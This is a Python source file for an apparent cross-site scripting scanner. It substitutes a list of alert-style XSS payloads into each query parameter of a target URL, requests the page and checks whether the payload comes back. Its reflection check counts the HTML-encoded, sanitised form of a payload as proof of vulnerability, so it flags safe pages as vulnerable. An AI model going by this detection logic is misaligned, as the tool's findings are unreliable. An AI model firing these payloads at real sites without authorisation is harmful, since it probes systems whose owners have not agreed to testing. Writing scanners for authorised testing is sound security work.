"""
XSS Tester
Tests URLs for Cross-Site Scripting vulnerabilities
"""
import requests
import logging
from urllib.parse import urlparse, urlencode, parse_qs
from typing import Dict, List
import re

logger = logging.getLogger(__name__)


class XSSTester:
    """Tests for XSS vulnerabilities"""
    
    # Common XSS payloads
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload='alert(1)'>",
        "<input onfocus='alert(1)'>",
        "javascript:alert(1)",
        "<marquee onstart='alert(1)'>",
    ]
    
    def __init__(self):
        self.session = requests.Session()
        self.timeout = 10
    
    def test_url(self, url: str) -> Dict:
        """Test URL for XSS vulnerabilities"""
        try:
            logger.info(f"Testing {url} for XSS")
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            vulnerable_params = []
            results = []
            
            # Test each parameter
            for param, values in params.items():
                for payload in self.PAYLOADS:
                    test_url = self._build_test_url(url, param, payload)
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        # Check if payload is reflected in response
                        if self._check_reflected(response, payload):
                            vulnerable_params.append(param)
                            results.append({
                                'param': param,
                                'payload': payload,
                                'status_code': response.status_code,
                                'vulnerable': True
                            })
                            logger.warning(f"XSS vulnerability found in {param}")
                    except Exception as e:
                        logger.debug(f"Error testing {param}: {e}")
            
            return {
                'vulnerable': len(vulnerable_params) > 0,
                'vulnerable_params': list(set(vulnerable_params)),
                'payloads_tested': len(self.PAYLOADS),
                'results': results
            }
        
        except Exception as e:
            logger.error(f"XSS test failed: {e}")
            return {
                'vulnerable': False,
                'vulnerable_params': [],
                'payloads_tested': 0,
                'results': []
            }
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with XSS payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        # Inject payload into parameter
        if param in params:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _check_reflected(self, response, payload: str) -> bool:
        """Check if payload is reflected in response"""
        response_text = response.text
        
        # Check if exact payload or sanitized version is reflected
        if payload in response_text:
            return True
        
        # Check for HTML-encoded version
        html_encoded = self._html_encode(payload)
        if html_encoded in response_text:
            return True
        
        return False
    
    @staticmethod
    def _html_encode(text: str) -> str:
        """HTML encode text"""
        return (text.replace('&', '&amp;')
                   .replace('<', '&lt;')
                   .replace('>', '&gt;')
                   .replace('"', '&quot;')
                   .replace("'", '&#x27;'))
